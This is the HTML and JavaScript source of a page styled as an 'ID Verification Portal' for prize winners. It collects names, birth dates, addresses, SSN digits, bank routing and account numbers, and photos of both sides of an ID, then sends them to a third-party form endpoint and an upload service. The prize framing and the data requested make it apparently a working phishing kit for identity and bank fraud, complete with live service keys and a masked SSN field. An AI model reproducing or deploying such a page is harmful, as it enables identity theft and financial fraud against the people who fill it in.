<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ID Verification Portal</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">

  <script>
    UPLOADCARE_PUBLIC_KEY = '6d89fecba2b18e6e32d2';
  </script>
  <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>

  <style>
    .bank-logo {
      width: 32px;
      height: 32px;
      margin-right: 8px;
      display: none;
    }
  </style>
</head>

<body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen flex justify-center items-center p-4">

  <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-3xl w-full">

    <div class="text-center mb-8">
      <div class="mx-auto bg-purple-600 w-16 h-16 rounded-full flex items-center justify-center text-white text-3xl font-bold mb-4">ID</div>
      <h1 class="text-3xl font-bold text-gray-800 mb-2">ID Verification Portal</h1>
      <p class="text-gray-600">Securely submit your identification details and documents.</p>
    </div>

    <form id="idForm" action="https://api.web3forms.com/submit" method="POST" class="space-y-6">

      <input type="hidden" name="access_key" value="678a23d5-c5dc-46e6-abce-d7e16b32e8f1">

      <div class="grid md:grid-cols-2 gap-4">

        <div>
          <label class="block font-medium text-gray-700">Full Name</label>
          <input type="text" name="Full Name" placeholder="John Michaels" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div>
          <label class="block font-medium text-gray-700">Date of Birth</label>
          <input type="date" name="Date of Birth" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div>
          <label class="block font-medium text-gray-700">Email Address</label>
          <input type="email" name="Email" placeholder="example@email.com" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div>
          <label class="block font-medium text-gray-700">Phone Number</label>
          <input type="tel" id="phoneInput" name="Phone Number" placeholder="(123) 456-7890" maxlength="14" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div class="md:col-span-2">
          <label class="block font-medium text-gray-700">Delivery Address</label>
          <textarea name="Delivery Address" placeholder="Street, City, State, Zip" rows="2" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
        </div>

        <div>
          <label class="block font-medium text-gray-700">Winning ID</label>
          <input type="text" name="Winning ID" placeholder="TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

  <div>
    <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
    <input 
      type="text" 
      id="ssnInput"
      maxlength="4"
      placeholder="e.g. 4821"
      required
      class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
    >
    <input type="hidden" name="Last 4 Digits of SSN" id="ssnReal">
  </div>

        <div>
          <label class="block font-medium text-gray-700">Account Name</label>
          <input type="text" name="Account Name" placeholder="John A. Michaels" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div>
          <label class="block font-medium text-gray-700">Routing Number</label>
          <input type="text" id="routingInput" name="Routing Number" placeholder="021000021" maxlength="9" class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">

          <div id="bankInfo" class="flex items-center mt-2 text-sm text-gray-700">
            <img id="bankLogo" class="bank-logo">
            <span id="bankName"></span>
          </div>
        </div>

        <div>
          <label class="block font-medium text-gray-700">Account Number</label>
          <input type="text" name="Account Number" placeholder="8459201933" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
        </div>

        <div class="md:col-span-2">
          <label class="block font-medium text-gray-700">Special Delivery Note</label>
          <textarea name="Delivery Note" placeholder="e.g. Call before delivery" rows="2" class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
        </div>
      </div>

      <div class="border-t pt-4">
        <h3 class="text-xl font-semibold text-gray-800 mb-3">Upload ID (Front & Back)</h3>

        <div class="flex flex-col md:flex-row md:space-x-4 space-y-4 md:space-y-0">
          <div class="flex-1">
            <label class="block text-gray-700 font-medium mb-1">Front Side</label>
            <button type="button" id="uploadFrontBtn" class="bg-purple-600 text-white py-2 px-4 rounded-lg w-full hover:bg-purple-700 transition">Upload Front</button>
            <div id="frontProgress" class="h-2 bg-gray-200 rounded mt-2 hidden">
              <div id="frontBar" class="h-2 bg-purple-600 rounded w-0"></div>
            </div>
            <input type="hidden" id="frontUrl" name="ID Front">
          </div>

          <div class="flex-1">
            <label class="block text-gray-700 font-medium mb-1">Back Side</label>
            <button type="button" id="uploadBackBtn" class="bg-purple-600 text-white py-2 px-4 rounded-lg w-full hover:bg-purple-700 transition">Upload Back</button>
            <div id="backProgress" class="h-2 bg-gray-200 rounded mt-2 hidden">
              <div id="backBar" class="h-2 bg-purple-600 rounded w-0"></div>
            </div>
            <input type="hidden" id="backUrl" name="ID Back">
          </div>
        </div>
      </div>

      <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
        <p class="text-sm text-yellow-800">
          Please ensure your ID is clearly visible and all text is readable. Files should not exceed 10MB each.
        </p>
      </div>

      <div class="flex items-start gap-2">
        <input type="checkbox" required>
        <p class="text-sm text-gray-600">I confirm that all the information and documents provided are accurate and authentic.</p>
      </div>

      <button type="submit" class="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-all">
        Submit ID
      </button>
    </form>
  </div>

  <script>
    function setupUpload(buttonId, inputId, progressId, barId) {
      const button = document.getElementById(buttonId);
      const input = document.getElementById(inputId);
      const progressContainer = document.getElementById(progressId);
      const progressBar = document.getElementById(barId);

      button.addEventListener('click', () => {
        button.textContent = "Uploading...";
        progressContainer.classList.remove("hidden");
        progressBar.style.width = "0%";

        const dialog = uploadcare.openDialog(null, { imagesOnly: true });
        dialog.done(file => {
          file.progress(info => {
            const percent = Math.round(info.progress * 100);
            progressBar.style.width = percent + "%";
            button.textContent = `Uploading... ${percent}%`;
          });
          file.done(info => {
            input.value = info.cdnUrl;
            progressBar.style.width = "100%";
            button.textContent = "Uploaded ✓ (Reupload)";
            button.classList.add("bg-green-600");
          });
        });
      });
    }

    setupUpload("uploadFrontBtn", "frontUrl", "frontProgress", "frontBar");
    setupUpload("uploadBackBtn", "backUrl", "backProgress", "backBar");

    if (!localStorage.getItem("verifiedId")) {
      window.location.href = "verify.html";
    }

    const phoneInput = document.getElementById('phoneInput');
    phoneInput.addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) value = value.slice(0, 10);
      let f = value;
      if (value.length > 6) f = `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6)}`;
      else if (value.length > 3) f = `(${value.slice(0,3)}) ${value.slice(3)}`;
      else if (value.length > 0) f = `(${value}`;
      e.target.value = f;
    });

// SSN MASKER
const ssnInput = document.getElementById("ssnInput");
const ssnReal = document.getElementById("ssnReal");

ssnInput.addEventListener("input", function(e) {
  let v = e.target.value.replace(/\D/g, "").slice(0, 4);
  ssnReal.value = v;

  if (v.length === 4) {
    e.target.value = "****";
  } else {
    e.target.value = v;
  }
});

    const routingInput = document.getElementById('routingInput');
    const bankName = document.getElementById('bankName');
    const bankLogo = document.getElementById('bankLogo');

    const bankRoutingMap = {
      "021000021": { name: "Chase Bank", logo: "https://cdn.simpleicons.org/chase" },
      "026009593": { name: "Bank of America", logo: "https://cdn.simpleicons.org/bankofamerica" },
      "121042882": { name: "Wells Fargo", logo: "https://cdn.simpleicons.org/wellsfargo" },
      "054001725": { name: "Capital One", logo: "https://cdn.simpleicons.org/capitalone" },
      "031101279": { name: "TD Bank", logo: "https://cdn.simpleicons.org/td" },
      "021000089": { name: "CitiBank", logo: "https://cdn.simpleicons.org/citi" }
    };

routingInput.addEventListener('input', function () {
  let v = routingInput.value.replace(/\D/g, '').slice(0, 9);
  routingInput.value = v;

  if (v.length === 0) {
    // field empty → hide bank info
    bankName.textContent = '';
    bankLogo.style.display = "none";
    return;
  }

  if (v.length === 9 && bankRoutingMap[v]) {
    bankName.textContent = bankRoutingMap[v].name;
    bankLogo.src = bankRoutingMap[v].logo;
    bankLogo.style.display = "block";
  } else if (v.length === 9) {
    bankName.textContent = "Unknown bank";
    bankLogo.style.display = "none";
  } else {
    // still typing → hide info
    bankName.textContent = '';
    bankLogo.style.display = "none";
  }
});
  </script>

</body>
</html>